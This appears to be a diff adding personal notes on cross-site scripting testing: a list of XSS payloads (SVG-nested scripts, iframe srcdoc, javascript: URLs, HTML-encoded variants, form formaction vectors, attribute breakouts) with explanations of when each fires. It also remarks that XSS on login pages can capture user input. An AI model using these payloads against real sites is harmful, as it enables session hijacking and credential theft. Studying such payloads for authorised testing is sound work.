@@ -1,0 +1,49 @@
+LOOK AT THE CPS BYPASS WEBSITE!!
+Also look at portswigger XSS cheat sheet!! 
+** if our input is being added by the js innerhtml function the normal <script> payload WONT WORK (on its own!! **
+
+**We need to try to find the JS code that is reflecting our input into the page, this will show us the context and give us a better idea of how we may be able to exploit. Search for the elemnts Id or class in the JS. **
+
+// THE SVG PAYLOADS ARE MUST USE IN ALL XSS TESTING GOING FORWARD
+Payloads: 
+<svg><textarea><script>alert()</script></textarea></svg>
+<svg><textarea><img/src='sdffdfsd'/onnerror='alert(1)'</textarea></svg>
+<svg><style><img src='sdffdfsd' onnerror='alert(1)'</style></svg>
+<svg width='200' height='100' xmlns='https://www.w3.org/2000/svg><style><script src='https://foo.com'></script></style></svg>
+${alert(1)} 						
+<a href=javascript:alert(1)>link</a>
+<iframe srcdoc="&lt;script>alert(1)&lt;/script>"></iframe>
+&#106avascript&colon;alert(1)
+javascript://targetdomain.com/%0aalert(1)
+<a href=javascript:alert(1)>link</a>
+<iframe src="javascript:alert(1)"></iframe>
+<form action="javascript:alert(1)"><button>submit</button></form>
+<form id="f2"></form><button form="f2" formaction="javascript:alert(2)">submit</button>
+
+-----------------------
+Input Reflected in HTML:
+sometimes our input in reflect into an HTML attribute which requires us to escape the quotes and the closing tag eg ">. If tags are not allowed we can do " tabindex=1 onfocus="alert(1)" x=" which would execute the js if are input is in a attribute.
+
+Iframe srcdoc: 
+the srcdoc attribute can take HTML. So even if our input is reflected using doucment.body.innerHTML we can still get script tags to execute if we put it in the srcdoc attribute: 
+	<iframe srcdoc="&lt;script>alert(1)&lt;/script>"></iframe>
+
+If we are put into a script we can try: 
+	${alert(1)} 
+-----------------------
+JS pseudo protocol: (javascript:confirm syntax) 
+this works in URL & certain html attributes. IF we ever see content of our choosing being embedded in a page (like embedding a youtube vid) test thoroughly. This will likely use an iframe and our input will be the SRC so we can use the same payload as below. The site may require it have say youtube somewhere in the value so we could do (replace youtube w/ required domain: 	javascript:alert(1);console.log('youtube.com')
+This can happen if we can add website links as well like adding a website to our social media profile. Again be aware. This works even if <>'" are escaped.
+
+This type of payload will also be triggered if we can control the value of window.location. Any redirect url component could cause this to execute eg a ?redirect= param even potentially if its just referencing a path.*****login pages often have redirects and if we can execute XSS on a login we CAN ACESS THE USERS INPUT making the vuln a lot more impactful******
+
+&#106avascript&colon;alert(1)	// also excutes. **anytime were in html tags we can html encode stuff**
+javascript://targetDomain.com/%0aalert(1)   // this is amazing research. we can have the target domain in our payload and structure it like a URL but still get XSS using this payload. Wherever we see redirects or URLs being refereneced in some way we have to try this. 
+
+<a href=javascript:alert(1)>link</a>
+<iframe src="javascript:alert(1)"></iframe>	// requires NO user interaction
+
+//form/button xss both require user interaction.
+<form action="javascript:alert(1)"><button>submit</button></form>
+<form id="f2"></form><button form="f2" formaction="javascript:alert(2)">submit</button>
+-----------------------
